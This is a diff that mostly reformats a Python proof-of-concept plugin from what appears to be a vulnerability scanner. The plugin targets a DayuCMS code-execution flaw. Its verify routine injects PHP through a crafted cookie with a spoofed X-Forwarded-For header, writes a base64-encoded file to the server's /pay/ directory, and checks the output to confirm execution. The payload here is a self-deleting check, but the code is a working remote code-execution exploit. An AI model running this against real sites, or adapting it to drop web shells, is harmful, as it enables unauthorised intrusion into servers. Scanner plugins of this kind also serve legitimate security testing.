@@ -6,6 +6,7 @@ import random
 import base64
 import hashlib
 
+
 class Vuln(ABVuln):
     vuln_id = 'DayuCMS_0001'  # 平台漏洞编号，留空
     name = 'DayuCMS 代码执行漏洞'  # 漏洞名称
@@ -25,8 +26,10 @@ class Vuln(ABVuln):
 def md5(str):
     return hashlib.md5(str).hexdigest()
 
+
 def dayucms_md5(str):
     return md5(str)[8:24]
+
 
 class Poc(ABPoc):
     poc_id = '54401c88-a4ee-4ca4-a10f-42ff3897dc0f'
@@ -57,21 +60,24 @@ class Poc(ABPoc):
             cookie_key = cookie_pre[:-6] + cookie_key
 
             vs = 'PD9waHAgdmFyX2R1bXAobWQ1KDEyMykpO3VubGluayhfX0ZJTEVfXyk7'
-            verify_shell = 'fputs(fopen(base64_decode(%s),w),base64_decode(%s))' % (filename, vs)
+            verify_shell = 'fputs(fopen(base64_decode(%s),w),base64_decode(%s))' % (
+                filename, vs)
             verify_shell = '1%3b' + verify_shell
             false_headers = {'X-Forwarded-For': ip}
             false_cookies = {cookie_key: verify_shell, cookie_pre: '1'}
-            verify_req = requests.get(verify_url, cookies = false_cookies, headers = false_headers)
+            verify_req = requests.get(
+                verify_url, cookies=false_cookies, headers=false_headers)
             verify_shell_url = '%s/pay/%d.php' % (self.target, filenum)
             if '202cb962ac59075b964b07152d234b70' in requests.get(verify_shell_url).content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
